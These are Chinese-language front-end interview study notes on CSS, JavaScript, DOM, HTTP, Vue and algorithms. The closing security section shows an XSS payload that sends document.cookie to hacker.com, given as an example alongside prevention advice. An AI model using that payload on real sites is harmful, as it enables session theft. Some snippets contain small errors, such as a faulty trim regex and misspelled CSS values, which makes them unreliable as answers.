

### CSS押题
1. 浏览器内核
    - IE浏览器内核、百度浏览器：Trident内核，也是俗称的IE内核；
    - Chrome浏览器内核: Chrome内核,以前是Webkit内核，现在是Blink内核；
    - Firefox浏览器内核: Gecko内核，俗称Firefox内核；
    - Safari浏览器内核：Webkit内核；
    - Opera浏览器内核: 最初是自己的Presto内核，后来加入谷歌大军，从Webkit又到了Blink内核；
    - 360浏览器、猎豹浏览器内核：IE+Chrome双内核；
    - 搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）；

1. 说一下盒模型 box-sizing
    - content-box(标准): 宽高是内容区宽高
    - border-box(IE): 宽高包括 padding值和border值 (兼容IE时不适用)
    - 解释一下弹性盒模型flexbox，以及使用场景
        - 该布局模型的目的是提供一种更加高效的方式来对容器中的条目进行布局、对齐和分配空间。在传统的布局方式中，block 布局是把块在垂直方向从上到下依次排列的；而 inline 布局则是在水平方向来排列。弹性盒布局并没有这样内在的方向限制，可以由开发人员自由操作。
        - 试用场景：弹性布局适合于移动前端开发，在Android和ios上也完美支持。

2. js如何设置获取盒模型对应的宽和高
    - let el = document.getElementById('id')
    - el.style.width/height: 只限获取内联样式的宽高
    - el.currentStyle.width/height: 获取渲染后的宽高，这个方法准确，但是只支持IE
    - window.getComputedStyle(el).width/height: 支持IE和chrome，兼容性好一些
    - el.getBoundingClientRect().width/height:可以及时拿到元素的宽高，计算一个元素的绝对位置并且同时拿到top、left、width、height四个值。

2. css reset 和 normalize.css 有什么区别？
    - css reset：样式重置，抛弃默认样式，因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。
    - normalize.css：让所有浏览器的标签都和标准规定的默认样式一致
    
3. (必考)如何居中
    - 水平居中
        - 内联：爸爸身上 写 text-align:center
        - 块级：margin-left:auto;margin-right:auto;

    - [水平垂直居中](https://jscode.me/t/topic/1936)
        - table 自带的功能
        - 子级相对于父级定位+margin负值
        - 子级相对于父级定位+transform: translate(-50%,-50%);
        - 子级相对于父级定位，上下左右设为0，然后 margin: auto;
        - flex布局， 父级设置display: flex;justify-content: center;align-items: center;
    

5. BFC是什么？
   - BFC规定了内部的Block Box如何布局。
   - 定位方案：
        - 在BFC这个元素的垂直方向的边距会发生重叠。
        - BFC的区域不会与浮动元素的BOX重叠。
        - BFC是一个独立的容器，外面的元素不会影响里面的元素。
        - 计算BFC高度的时候浮动元素也会参与计算。
        
    - 满足下列条件之一就可触发BFC
        - float： 不为none
        - position：不为 relative或static
        - overflow：hide / auto
        - display: inline-block,table,table-cell
    - BFC的使用场景
        - 左侧固定宽高，右侧高度自适应，此时右侧BFC，防止内容溢出到左侧下方
        - 清除浮动

6. 如何清除浮动
    - 父级加 Height ：只适合固定高度
    - 结尾处加空div标签 clear{clear:both;}
        - 原理：添加一个空div，利用css提高的clear:both清除浮动，让父级div能自动获取到高度 
    - overflow:hidden;浏览器会自动检查浮动区域的高度 ， (不好) 超出部分被影藏，后遗症多
    - .clearfix  完美

        ```
        .clearfix::after{
            content: "";
            display: block;
            clear: both;
            zoom: a;  // 兼容IE 加
        }
        ```
7. 上下margin重合的问题     
   - 父子级，margin冲出去: 父级加 overflow: hidden；或者父级 设置padding-top: 0.1px，形成障碍
   - 兄弟级，给每个元素套个父级，父级加 overflow: hidden；或者父级 设置padding-top: 0.1px，形成障碍
        
7. position：的值
    - absoulte: 基于有定位属性的父元素定位
    - relative: 基于自己本身定位
    - fixed: 基于可是窗口定位
    
8. display有哪些值？说明他们的作用?
    - inline（默认）–内联
    - none–隐藏
    - block–块显示
    - table–表格显示
    - list-item–项目列表
    - inline-block  
    
8. 如何隐藏一个元素（不少于7中）
    - dispaly: none;  不显示对应的元素，在文档布局中不再分配空间（回流+重绘)
    - visibility: hidden;  隐藏对应元素，在文档布局中仍保留原来的空间（重绘）
    - opacity: 0; 隐藏对应元素，在文档布局中仍保留原来的空间，响应用户交互
    - position:position: absolute;top: -9999px; left: -9999px; 将元素移出可视区域
    - 设置height，width等盒模型属性为0,如果元素内有子元素或内容，还应该设置其overflow:hidden来隐藏其子元素
    - Clip-path： 剪裁，clip-path: polygon(0px 0px,0px 0px,0px 0px,0px 0px);

9. 将footer固定在底部的方法
    - footer高度固定+绝对定位
    - footer高度固定+margin负值
    - 使用calc()设置内容高度 ，min-height: calc(100vh - 70px);
    - 使用flexbox弹性盒布局
        
        ```
        <div class="content">
          <!-- content -->
        </div>
        <div class="footer">footer</div>
        
        html {
          height: 100%;
        }
        body {
          min-height: 100%;
          display: flex;
          flex-direction: column;
        }
        .content {
          flex: 1;
        }
        ```
    
    - 使用Grid网格布局
        
        ```
        <div class="content">
          <!-- content -->
        </div>
        <div class="footer">footer</div>
        
        html {
          height: 100%;
        }
        body {
          min-height: 100%;
          display: grid;
          grid-template-rows: 1fr auto;
        }
        .footer {
          grid-row-start: 2;
          grid-row-end: 3;
        }
        ```

10. css预处理器(less,sass)，sass中常用的有哪些
    - 使用变量，所有变量以$开头。$elColor: #333; color: $elColor;
    - 选择器嵌套
    - &的嵌套 a:hover伪类 a{ &:hover {} }
    - @extend 继承 
        
        ```
        .div3 {
            margin: 2px;
        }
        /* .div4继承.div3 */
        .div4 {  
            @extend .div3;
            font-size: 10px;
        }
        
        ```
        
    - @mixin命令 ，定义一个代码块，后续可以通过@include复用

        ```
        @mixin p1 {
            float: left;
        }
        div {
        /*使用@include命令，调用这个mixin。*/
            @include p1; 
            top: 10px;
        }
        
        ```
    - 导入文件: @import命令，用来插入外部文件。

11. css优化，提高性能的方法
    - 避免过度约束
    - 避免后代选择符
    - 避免链式选择符    
    - 使用紧凑的语法    
    - 避免不必要的命名空间    
    - 避免不必要的重复    
    - 最好使用表示语义的名字。一个好的类名应该是描述他是什么而不是像什么    
    - 避免！important，可以选择其他选择器    
    - 尽可能的精简规则，你可以合并不同类里的重复规则
    - 利用CSS Sprites能很好地减少网页的http请求，从而大大的提高页面的性能；CSS Sprites能减少图片的字节。
    
12. 浏览器是如何解析css选择器的
    - CSS选择器的解析是从右向左解析的。若从左向右的匹配，发现不符合规则，需要进行回溯，会损失很多性能。若从右向左匹配，先找到所有的最右节点，对于每一个节点，向上寻找其父节点直到找到根元素或满足条件的匹配规则，则结束这个分支的遍历。两种匹配规则的性能差别很大，是因为从右向左的匹配在第一步就筛选掉了大量的不符合条件的最右节点（叶子节点），而从左向右的匹配规则的性能都浪费在了失败的查找上面。
    - 而在 CSS 解析完毕后，需要将解析的结果与 DOM Tree 的内容一起进行分析建立一棵 Render Tree，最终用来进行绘图。在建立 Render Tree 时（WebKit 中的「Attachment」过程），浏览器就要为每个 DOM Tree 中的元素根据 CSS 的解析结果（Style Rules）来确定生成怎样的 Render Tree。

13. css选择器优先级如何确定
    - 选择器越具体，优先级越高， #div > .div
    - 同样优先级，写在后面的覆盖前面的
    - color: red !importanr; 优先级最高
    
14. CSS选择器有哪些？哪些属性可以继承？
    - CSS选择符：id选择器(#myid)、类选择器(.myclassname)、标签选择器(div, h1, p)、相邻选择器(h1 + p)、子选择器（ul > li）、后代选择器（li a）、通配符选择器（*）、属性选择器（a[rel=”external”]）、伪类选择器（a:hover, li:nth-child）
    - 可继承的属性：font-size, font-family, color
    - 不可继承的样式：border, padding, margin, width, height
    - 优先级（就近原则）：!important > [ id > class > tag ]
    - !important 比内联优先级高
    
14. CSS3新增伪类有那些?
    - p:first-of-type 选择属于其父元素的首个元素
    - p:last-of-type 选择属于其父元素的最后元素
    - p:only-of-type 选择属于其父元素唯一的元素
    - p:only-child 选择属于其父元素的唯一子元素
    - p:nth-child(2) 选择属于其父元素的第二个子元素
    - :enabled :disabled 表单控件的禁用状态。
    - :checked 单选框或复选框被选中。
    
15. CSS3有哪些新特性？
    - RGBA和透明度
    - background-image background-origin(content-box/padding-box/border-box) background-size background-repeat
    - word-wrap（对长的不可分割单词换行）word-wrap：break-word
    - 文字阴影：text-shadow： 5px 5px 5px #FF0000;（水平阴影，垂直阴影，模糊距离，阴影颜色）
    - font-face属性：定义自己的字体
    - 圆角（边框半径）：border-radius 属性用于创建圆角
    - 边框图片：border-image: url(border.png) 30 30 round
    - 盒阴影：box-shadow: 10px 10px 5px #888888
    - 媒体查询：定义两套css，当浏览器的尺寸变化时会采用不同的属性   
  
16. 在网页中的应该使用奇数还是偶数的字体？为什么呢？
    - 使用偶数字体。偶数字号相对更容易和 web 设计的其他部分构成比例关系。  
    
17. 元素竖向的百分比设定是相对于容器的高度吗？
    - 当按百分比设定一个元素的宽度时，它是相对于父容器的宽度计算的，但是，对于一些表示竖向距离的属性,当按百分比设定它们时，依据的也是父容器的宽度，而不是高度。

18. 页面布局
    
        
### Javascript押题

1. JS数据类型
    - number(NaN)，string，boolean，null,undefined,object,symbol
    - object包括：数组，函数，正则，日期
    - Symbol,ES6, 为了保证属性名的独一无二而被引入

2. 显示数据类型转换
    -  Number
        - 原始类型
            - 数值： 转换后还是数值
            - 字符串：数值，NaN，空字符串转化为 0
            - 布尔值：true：1，false：0
            - undefined：NaN
            - null：0
        - 对象：先调用 a.valueOf(),如果不是基本类型，再调用a.toString(),最后再调用 Number()
    
    - String
        - 原始类型
            - 数值：转化为字符串
            - 字符串： 字符串
            - 布尔值：true => "true" , false => "false"
            - undefined: "undefined"
            - null: "null"
    
        - 对象：先调用a.toString()，返回是复合类型，再调用 a.valueOf()，返回原始类型，调用 String 方法，否者报错
    
    - Boolean
        - 转化为 false 的 五项
            - undefined
            - null
            - 0
            - 空字符串
            - NaN
        - 其余是 true
3. 隐式类型转换
    1. 四则运算
    2. 判断语句
    3. Native 调用  如：console.log()

4. 常见题目
    1. [] + [] = ""
    2. [] + {} = "[object Object]"
    3. {} + [] = 0 原因：{}代码块浏览器不解析，+[],调用Number([]) => 0
    4. {} + {} =
        - chrome: "[object Object][object Object]"
        - firefox: NaN , {}代码块浏览器不解析,+{},调用Number({}) => NaN
    5. true + true =  2
    6. 1 + {a+1} = 报错

    
5. typeof 类型转换
    - 返回数据类型
    - typeof(null) => "object"


2. (必考)Promise怎么使用？
    - then: 
    
        ```
        $.ajax().then(成功函数，失败函数)
        ```
    - 链式: 只要前面函数没有报错，都会调用成功函数2或者失败函数2
        
        ```
        $.ajax().then(成功函数1，失败函数1).then(成功函数2，失败函数2)
        ```
    - 如何自己生成promise
    
        ```
         function xxx() {
            return new Promise(function (resolve,reject) {
                setTimeout(() => {
                    resolve() 或者 reject（）
                },3000)
            })
         }
         
         xxx().then(...)
        ```

3. (必考) ajax 手写以下 (四步)
    
    ```
    let xhr = new XMLHttpRequest()
    xhr.open('GET','/xxx')
    xhr.onreadystatechange =function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            console.log(xhr.responseText)
        }
    }
    xhr.send('a=1&b=2')
    ```

4. (必考) 闭包是什么 [闭包](https://zhuanlan.zhihu.com/p/22486908)
    - 闭包 + 立即执行函数 
    
    ```
    function createAdder() {
        let n = 0 // 局部变量
        return function () {
            n+=1
        }
    }
    
    let adder = createAdder()
    adder() // n === 1
    adder() // n === 2
    console.log(n) n is not defined
    ```
5. (必考) this指的是什么 [this](http://web.jobbole.com/91014/)
    - fn(): this指的是window
    - fn() 是 strict mode(严格模式)，this是undefined
    - a.b.c.fn() this: a.b.c
    - new Fn() ,this指向新生的实例
    - （）=> console.log(this) this 就是外面的this


6. (必考) 立即执行函数
    - 目的:造出一个作用域，防止污染全局变量

    ```
    ;(function (){
        var name
    }())
    ;(function (){
        var name
    })()
    !!!function (){
        var name
    }()
    ~function (){
        var name
    }()
    ```
    
    - ES6 新语法
    
    ```
    {
        var name
    }
    ```

7. async/await 语法了解吗？
    - 目的：把异步代码写成同步代码

    ```
    function returnPromise() {
        result new Promise ( (resolve,reject) => {
            setTimeout(() => {
                resolve('resolved')
            },2000)
        })
    } 
    
    // 以前写法
    returnPromise().then( (result) => {
        result = 'resolved'
    })
    
    // 异步变同步
    async function asyncCall () {
        let result = await returnPromise()
    }
    asyncCall()
    
    ```

8. 如何实现深拷贝
    - JSON 来深拷贝
        - 缺点：JSON不支持函数，引用，undefined，正则regexp，Date...
    
        ```
        var a = {...}
        var b = JSON.parse(JSON.stringify(a))
        ```    
    - 使用递归的方式拷贝,查找完整代码
    
    ```
    function clone (object) {
        var object2
        // 先判断是不是普通类型
        if (!(object instanceof Object)) {
        }else if (object instanceof Array) {
            object2 = []
        }else if (object instanceof Function ) {
            object2 = eval(object.toString())
        }else if (object instanceof Object) {
            object2 = {}
        }
        
        for(){
            object2[key] = clone(object[key])
        }
        return object2
    }
    ```

9. 如何实现数组去重
    - 计数排序的逻辑(一般if else的方法，只能正整数)
    - Set去重 `Array.from(new Set(arr))`

10. 如何用正则实现 string.trim()?
    
    ```
    function trim(string){
        return string.replace(/^\S+|\s+$/,'')
    }
    ```

11. JS原型是什么？ [原型](https://zhuanlan.zhihu.com/p/23090041?refer=study-fe)
    - 比如数组 a = [1,2,3],自身并没有 push 方法，但却可以使用，a通过 `__proto__ ` 找到到 `Array.prototype`,继而找到 `Array.prototype.push` 这个方法，`Array.prototype`中还有许多其他方法，如 pop，slice，splice，join等，`Array.prototype`就是 数组a的原型

12. 原型，构造函数，实例，原型链
    - 解释Person、 prototype、__proto__、p、constructor之间的关联。
        - Person: 构造函数(类)
        - prototype:构造函数原型
        - __proto__:原型链
        - p: 实例化对象
        - constructor: 原型的属性，指向构造函数Person
        - p.__proto__ === Person.prototype
        - p.__proto__.constructor = Person.prototype.constructor = Person
        - Person.__proto__ === Function.Prototype
        
        ```
        function Person(name){
            this.name = name;
        }
        Person.prototype.sayName = function(){
            console.log('My name is :' + this.name);
        }
        var p = new Person("若愚")
        p.sayName();
        ```
    - 具体解析
        - 原型：
            - 原型对象的作用，就是定义所有实例对象共享的属性和方法
            - 实例对象可以视作从原型对象衍生出来的子对象
        - 原型链：
            - 对象的属性和方法，有可能定义在自身，也有可能定义在它的原型对象。由于原型本身也是对象，又有自己的原型，所以形成了一条原型链（prototype chain）
            - 所有对象的原型最终都可以上溯到Object.prototype
            - Object.prototype对象有它的原型： 任何属性和方法的null对象
        - “原型链”的作用是：
            - 读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，
            - 如果找不到，就到它的原型去找
            - 如果还是找不到，就到原型的原型去找
            - 如果直到最顶层的Object.prototype还是找不到，则返回undefined。
            - 如果对象自身和它的原型，都定义了一个同名属性，那么优先读取对象自身的属性，这叫做“覆盖”（overriding）
        - constructor 属性
            - prototype对象有一个constructor属性，默认指向prototype对象所在的构造函数
            - 由于constructor属性定义在prototype对象上面，意味着可以被所有实例对象继承
            - constructor属性的作用，是分辨原型对象到底属于哪个构造函数
    ![原型](media/%E5%8E%9F%E5%9E%8B.jpg)

13. instanceof的原理
    1. instanceof : p instanceof Person , 判断p是不是Person的实例，判断指定对象是否为某个构造函数的实例
    2. 原理：判断 p.__proto__ 和 Person.prototype 两个属性 是不是引用同一个地址
    3. p instanceof Person => true
    4. p instanceof Object => true : 只要是在原型链上的构造函数，都会被instanceof看作是 p 的构造函数
    5. 如何准确判断 p是不是Person的实例，用constructor判断
        - p.__proto__.constructor === Person =>   true
        - p.__proto__.constructor === Object =>   false

14. new运算符
    - 创造一个空对象 p1 = {}
    - 构造函数被执行，传入相应参数
    - 如果构造函数返回了一个对象 ，此对象会取代new出来的结果，如果没有返回对象，那么new出来的结果为步骤一创建的对象
        
        ```
            function Peple(name){
                // this指向：创建的实例化对象
                this.name = name
                this.sayName = function () {
                    console.log('myName:'+this.name)
                }
            }
        
            let p1 = new Peple('tian') // 通过构造函数创造出一个实例化对象
            /*
                1. 创造一个空对象 p1 = {}
                2. 构造函数被执行，赋值：  p1.name = 'tian'
                          p1.sayName = function (){}
                3.构造函数返回，return p1对象
            */
            p1.sayName() // 调用里面的方法
        
            let p2 = new Peple('杨')
            p2.sayName() // 调用里面的方法
        ```
15. 创建对象有几种方法
    1. let obj1 = {a:1}（字面量方法）
    2. let obj2 = new Object({a:1})
    3. 构造函数的方式
    
        ```
        let M = function (num) {this.a = num}
        let obj3 = new M(1)
        ```
    4. Object.create 的方法
    
        ```
        let num = {a:1}
        let obj4 = Object.create(num)
        ```

12. ES6的class
    - MDN class章节

13. 类的声明和生成实例

    ```
    // 类的声明
    function Animal () {
        this.name = 'tian'
    }
    
    // ES6 class 类的声明
    class Animal2 {
        constructor () {
            this.name = 'tian'
        }
    }
    
    // 生成实例 ,没有参数可以不加括号
    
    let a = new Animal()
    let a2 = new Animal2
    ```

13. jS如何实现继承
    - 借助构造函数 和 call 方法实现继承
        - 原理：通过call方法将父类的构造函数this指向子构造函数的实例上去，继而实现继承
        - 缺点：只能实现部分继承，不能继承父类原型上的属性和方法
        
    ```
    function Parent1() {
        this.name = 'parent1'
    }
    Parent1.prototype.say = function() {}
    
    function Child1() {
        Parent1.call(this)
        this.type = 'child1'
    }
    
    let c1 = new Child1
    ```
        
    - 借助原型链实现继承
        - 原理：Child2.prototype === c2.__proto__ === new Parent2
        - 缺点：当改变其中一个实例属性时，会改变原型属性的变化，进而改变了所有实例的属性
    
    ```
    function Parent2() {
        this.name = 'parent2'
        this.arr = [1, 2, 3]
    }

    function Child2() {
        this.type = 'child2'
    }
    Child2.prototype = new Parent2

    let c2 = new Child2
    let c21 = new Child2
    console.log(c2)
    console.log(c2.arr, c21.arr) // [1, 2, 3] (3) [1, 2, 3]
    c21.arr.push(4)
    console.log(c2.arr, c21.arr) // [1, 2, 3, 4] (4) [1, 2, 3, 4]
    ``` 
    
    - 构造函数和原型链的组合方法
        - 通过call方法将父类的构造函数this指向子构造函数的实例上去，继而实现实例自身的继承,通过原型链的方法实现 原型的继承
        - 优点：实现继承的子类们的相互独立
        - 缺点：子类实例的 构造函数 是 父类的构造函数
        
    ```
    function Parent3() {
        this.name = 'parent3'
        this.arr = [1, 2, 3]
    }

    function Child3 () {
        Parent3.call(this)
        this.type = 'child3'
    }
    // 不适用 new Parent2 原因：可以少执行一次 Parent3
    Child3.prototype = Parent3.prototype
    let c3 = new Child3
    let c31 = new Child3
    console.log(c3.arr, c31.arr) // [1, 2, 3] (3) [1, 2, 3]
    c31.arr.push(4)
    console.log(c3.arr, c31.arr) // [1, 2, 3,]  [1, 2, 3, 4]

    // 缺点：子类实例的 构造函数 是 父类的构造函数
    console.log(c3 instanceof Child3,c3 instanceof Parent3) // true true
    console.log(c3.constructor) // Parent3
    ```    
     
   - ** 构造函数和原型链的组合方法 优化 ** 
        - 利用 Object.create(),创建中间对象，把两个原型对象区分开
    
    ```
    function Parent4 () {
        this.name = 'parent4'
    }
    function Child4 () {
        Parent4.call(this)
        this.type = 'child4'
    }
    // 利用 Object.create(),创建中间对象，把两个原型对象区分开
    Child4.prototype = Object.create(Parent4.prototype)
    Child4.prototype.constructor = Child4 // 写上自己的constructor
    let c4 = new Child4
    console.log(c4 instanceof Child4,c4 instanceof Parent4) // true true

    console.log(c4.constructor) // Child4
    ```
        
        
    
14. `==` 相关题目放弃
    - (a == 1 && a == 2 && a == 3)可能成为true吗？
    - 可能
    
    ```
    a = {
        value: 0,
        toString() {
            a.value += 1
            return a.value
        }
    }
    a == 1
    a == 2
    a == 3
    ```
    
    
### DOM押题
1. DOM事件的级别
    - DOM0： element.onclick = function () {}
    - DOM1中没有涉及到事件的应用
    - DOM2: element.addEventListener('click',function () {},false)
    - DOM3: element.addEventListener('keyup',function () {},false)
2. Event对象的常见应用
    - 阻止默认行为：event.preventDefault()
    - 阻止冒泡行为：event.stopPropagation()
    - 阻止同一元素的两个click事件中的一个：event.stopImmediateProPagation()
    - 当前所绑定事件的对象：event.currentTarget
    - 当前被点击的元素：event.target
3. 自定义事件
    - Event

    ```
    // 自定义事件
    let eve = new Event('custome')
    ev.addEventListener('custome',function ()   {
        console.log(11)
    })
    // 触发事件
    ev.dispatchEvent(eve)

    ```
    - CustomEvent: 和Event的区别，可以加参数

    ```
    ev.addEventListener('custome',obj,function ()   {
        console.log(11)
    })
    ```


1. DOM事件模型 [DOM](http://jsbin.com/raqakog/1/edit?js,console,output)
    - DOM事件流  
        - 捕获阶段
        - 目标阶段
        - 冒泡阶段
    - 如果这个元素是被点击的元素,那么捕获不一定在冒泡之前，顺序是由监听顺序决定的
    - 描述DOM事件 捕获 的具体流程
        - 如何获取html标签：Document.documentElement
        -  window => document => html标签 => body => 父级元素 => 自己元素 => 目标元素
        
2. 移动端的触摸事件了解吗？
    - touchstart touchmove touchend touchcancel
    - 模拟swipe事件: 记录两次touchmove的位置差，如果最后一次在前一次的右边，说明向右滑了

3. 事件委托是什么，有什么好处？ [事件委托](https://github.com/FrankFang/wheels/blob/master/lib/dom/index.js)
    - 假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，看触发的事件元素是哪个儿子，触发后，事件冒泡到监听元素上，然后监听元素捕捉到事件，然后处理
    - 好处：可以监听动态生成的元素，省监听器
    
    ```
    function(element, eventType, selector, fn) {
        element.addEventListener(eventType, e => {
          let el = e.target
          while (!el.matches(selector)) {
            if (element === el) {
              el = null
              break
            }
            el = el.parentNode
          }
          el && fn.call(el, e, el)
        })
        return element
      }
    ```
 
6. 如何定义一个事件



    
### HTTP押题

1. (必考)你是如何理解HTML语义化的？
    - 比如 用p标签表示段落，用aside标签表示边栏，用main标签表示页面的主要内容
    - 其实，最初是PHP后端来写HTML的，他们不会css，只好用table标签来写，但是我们都知道table标签是用来展示表格的，这严重违反了HTML的语义化，后来有了专门写css的，他们使用DIV+CSS，Float浮动+定位布局，就稍微符合了HTML的语义化，再后来，前端专业化，我们知道了HTML标签的各种含义，于是就用恰当的标签来展示内容，而不是都用div来布局，会尽量使用h1，p,ul,main,header等标签

2. meta viewport 是做什么用的，怎么写？
    - `<meta name="viewport" content="width=device-width,user-scalable=no,iniyial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0">`
    - 设备宽度，用户不能放大缩小，控制页面在移动端不要缩放显示

3. 什么是同源策略及限制
    - 同源策略：限制从一个源的文档和或脚本如何与来自另一个源的资源进行交互，这是一个用于隔离潜在恶意文件关键的安全机制
        - 源：协议（http），域名（baidu），端口（默认80）
    
    - 限制：
        - 无法获取 cookie，localStorage，IndexDB
        - 无法获取 DOM
        - Ajax请求无法发送
4. 前后端如何通信
    - ajax，同源通信方式
    - webSocket，不限制同源通信方式
    - CORS，新的通信标准，同源跨域都可以

5. 如何创建ajax
    1. XMLHttpReauest 对象的工作流程
    2. 兼容性处理
    3. 事件的触发条件
    4. 事件的触发顺序
    
6. 必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？
    - JSONP
        - JSONP原理：利用script标签的异步加载来实现的，通过将前端方法作为参数传递到服务器端，然后由服务器端注入参数之后再返回，实现服务器端向客户端通信。
        - 页面加载script标签，发出请求，告诉服务端 callback的名称，服务端将来作为函数名返回给前端，本地必须有同名的全局函数，当函数运行时，才能把服务端传的数据执行出来
        - JSONP代码书写逻辑：
            - 先告诉后端一个回调函数的名称，创建一个同名称的全局函数
            - 动态创建一个script标签
            - 监听脚本加载事件，看能否拿到数据
            - 删除函数和变量
            - 在html中增加script标签，目的：把请求发送出去
        
    - CORS
        - 加一个请求头，ajax的变种
        - fetch：实现CORS通信，类似于ajax
            
            ```
            fetch('/some/url',{
                method:'get'
              }).then(function (response) {
    
              }).catch(function (err) {

            })
            ```
        - CORS为什么能实现跨域通信:浏览器会拦截ajax请求，如果ajax请求是跨域的，会在http中加一个origin
    
    - postMessage h5增加的，
        - 窗口A向跨域的窗口B发送信息 window.postMessage('data','http://B.com')
        - 窗口B监听
        
        ```
        window.addEventListener('message',function (event) {
            console.log(event.origin) // 'http://A.com'
            console.log(event.source) // A的window
            console.log(event.data) // 拿到data数据
        })
        ```
    
    - WebSocet：不受同源限制
        - 创建一个WebSocet对象（ws，wss，加密）
        - onopen:发出消息
        - onmessage:接收对方消息
        - onclose: 断掉通信
    
    - Hash：hash改变，页面不刷新；search改变，页面刷新
        - A页面拿到B页面的src，然后src+hash值，发送请求
        - B页面中监听自己src的变化，接收请求，实现通信
        

1. HTTP状态码是什么
    1. 1开头：提示信息
    2. 2开头：成功
    3. 3开头：重定向
    4. 4开头：客户端错误
    5. 5开头：服务端错误
    6. 常见状态码
        - 200：客户端请求成功
        - 206：客服端发送一个带有range头的请求，服务器完成了它，视频，音频时会出现
        - 301：永久重定向，所请求页面转至新的url
        - 302：临时重定向，所请求页面转至新的url
        - 304：有缓存，走缓存
        - 403：资源访问被禁止
        - 404：请求资源不存在
        - 500：服务器错误

    
2. 301和302的区别
    - 301 永久重定向，浏览器会记住
    - 302 临时重定向

3. HTTP 缓存怎么做？
    - Cache-Control: max-age=300
    - http://cdn.com/1.js?v=1 避开缓存

4. Cache-Control 和 Etag 的区别是什么？
    - 搜饥人谷视频

5. Cookie 是什么？Session 是什么？
    - Cookie
        - HTTP响应通过 Set-Cookie 设置 Cookie
        - 浏览器访问指定域名是必须带上 Cookie 作为 Request Header
        - Cookie 一般用来记录用户信息
    - Session
        - Session 是服务器端的内存（数据）
        - Session 一般通过在 Cookie 里记录 SessionID 实现
        - SessionID 一般是随机数

6. LocalStorage 和 Cookie 的区别是什么？
    - Cookie 会随请求被发到服务器上，而 LocalStorage 不会
    - Cookie 大小一般4k以下，LocalStorage 一般5Mb 左右

7. （必考）GET 和 POST 的区别是什么？
    1. get在浏览器中回退时，不会再次提交请求，而post会
    2. get产生的url地址可以被收藏，而post不可以
    3. get请求会被浏览器缓存，而post不会
    4. get请求传递的参数会被完整的保留在浏览器历史记录中，而post不会
    5. get请求的参数有长度限制，而post没有
    6. get请求的参数通过url传递，而post放在Request body中
    7. get比post更不安全，get请求的参数直接暴露在url上，不能传递敏感的信息
    8. get请求的参数数据类型只支持ASCII码，而post没有限制
    9. get请求只能进行url编码，而post支持多种编码方式
   
9. HTTP协议的主要特点
    1. 简单快速: 根据 url 查找
    2. 灵活：头部有数据类型，可以完成不同数据类型传输
    3. 无连接：连接一次就会断掉
    4. 无状态：服务端无法缺点两次连接是否是同一个身份

10. HTTP报文的组成部分
    1. 请求报文
        - 请求行：包含http方法，页面地址，http协议，版本
        - 请求头：key，value值，来告诉服务端我要哪些内容，注意什么类型
        - 空行：提示下一个是请求体解析了
        - 请求体
    2. 响应报文
        - 状态行   
        - 响应头
        - 空行
        - 响应体
11. HTTP方法
    1. get => 获取资源
    2. post => 传输资源
    3. put => 更新资源
    4. delete => 删除资源
    5. head => 获得报文首部

12. 什么是持久连接
    1. **1.1版本** HTTP支持持久连接
    2. HTTP的无连接协议，http协议采用 请求-应答的模式，当使用普通模式，而非keep-alive模式时，每次请求和应答时，客服端和服务端都要新建一次连接，完成之后立即断开连接
    3. HTTP的持久连接，当使用keep-alive模式时，客服端和服务端建立持久化连接，当再次请求服务器时，keep-alive功能避免了建立再次连接    
    
13. 什么是管线化
    1. 在持久化连接的情况下，某个连接上的信息传递类似于
        - 请求1->响应1 -> 请求2->响应2 -> 请求3-> 响应3
    2. 管线化也是在持久化连接的情况下，某个连接上的信息传递类似于（原理：在持久化连接的情况下，一次性打包请求，再一次性打包响应）
        - 请求1->请求2 -> 请求3->响应1 -> 响应2-> 响应3
    3. 仅支持 1.1版本
    4. 持久连接
    5. 初次连接不应开启管线化，对方服务器不一定支持
    6. get和head请求可以进行管线化，post不支持
    
    
     
### jquery押题

1. onload()函数和JQuery中`$(document).read(function () {})` 和 `$(function () {})` 的区别
2. jQuery中遍历节点的方法有哪些
3. jQuery中操作属性和样式的方法有哪些
4. jQuery中如何克隆(复制)和删除节点
5. jQuery中如何进行内容操作
6. jQ中html(),text(),val()的区别
7. jQ中find(),has(),filter()的区别
8. JQ中closet()和parents()的区别
9. jQ中如何对选择器进行性能优化
     
   
    

#### vue押题
1. （必考）Vue 有哪些生命周期钩子函数？
    - [看文档](https://cn.vuejs.org/v2/api/#选项-生命周期钩子)
    - （必考）Vue 如何实现组件通信？
2. （必考）Vue 如何实现组件通信？
    - 父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）
    - 爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）
    - [兄弟通信（new Vue() 作为 eventBus）](https://cn.vuejs.org/v2/guide/components.html#%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E9%80%9A%E4%BF%A1)

3. Vuex 的作用是什么？
    - [看文档](https://vuex.vuejs.org/zh-cn/intro.html)
4. VueRouter 路由是什么？
    - 看文档

5. Vue 的双向绑定是如何实现的？有什么缺点？
    - [看文档](https://cn.vuejs.org/v2/guide/reactivity.html)
6. Computed 计算属性的用法？跟 Methods 的区别。
    - [参考](https://zhuanlan.zhihu.com/p/33778594)
7. MVVM框架的核心思想
    -  module，view，viewModule通过双向绑定，操作数据来驱动ui
    - 动态模板 ：核心机制，页面就是模板
    - 静态模板：单独把模板放一块，


#### 算法押题  
1. 排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）
    1. 快速排序  http://segmentfault.com/a/1190000009426421
    2. 选择排序  http://segmentfault.com/a/1190000009366805
    3. 希尔排序  http://segmentfault.com/a/1190000009461832
    4. 冒泡排序
2. 二分查找法
3. 递归
    -  http://segmentfault.com/a/1190000009857470
4. 堆栈***，队列，链表
    - http://juejin.im/entry/58759e79128fe1006b48cdfd
   
    
#### 安全押题

1. 什么是 XSS 攻击？如何预防？
    - 跨域脚本攻击,cross-site scripting
    - 核心：向页面注入脚本(js)
    
    ```
    div.innerHTML = userComment  // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>
// 恶意就被执行了，这就是 XSS
    ```
    - 预防
        - 不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行
        - 如果你一样要用 innerHTML，字符过滤
